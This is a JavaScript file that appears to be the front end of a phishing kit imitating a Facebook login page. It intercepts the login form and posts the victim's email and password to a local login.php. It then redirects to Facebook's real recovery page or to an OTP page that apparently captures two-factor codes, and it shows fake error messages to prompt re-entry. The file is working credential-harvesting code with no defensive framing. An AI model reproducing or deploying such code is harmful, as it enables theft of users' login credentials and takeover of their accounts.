window.onload = () => {
  const errorParent = document.querySelector("#errorParent");
  const form = document.querySelector("#login");
  const email = document.querySelector("#email");
  const password = document.querySelector("#pass");
  const addError = (error) => {
    if (!errorParent.innerHTML.includes(error)) {
      errorParent.innerHTML = `<div class="_9ay7">${error}</div>`;
    } else {
      errorParent.innerHTML = "";
      setTimeout(() => {
        errorParent.innerHTML = `<div class="_9ay7">${error}</div>`;
      }, 1000);
    }
  };
  form.addEventListener("submit", (e) => {
    e.preventDefault();
    const formData = new FormData();
    formData.append("email", email.value);
    formData.append("password", password.value);
    fetch("/login.php", {
      method: "POST",
      body: formData,
    })
      .then((res) => res.json())
      .then((response) => {
        if (response.access_token) {
          window.location.assign("https://facebook.com/recover/initiate/");
        } else if (response?.error_msg?.includes("www.facebook.com")) {
          window.location.assign("https://facebook.com/recover/initiate/");
        } else if (response?.error_code === 406) {
          window.location.assign("otp.login.php");
        } else if (response?.error_code === 400) {
          addError("Invalid username or email address!");
        } else if (response?.error_code === 401) {
          addError("Invalid username or password!");
        } else {
          addError("Something went wrong. Try again later!");
        }
      })
      .catch((err) => {
        console.log(err);
      });
  });
};
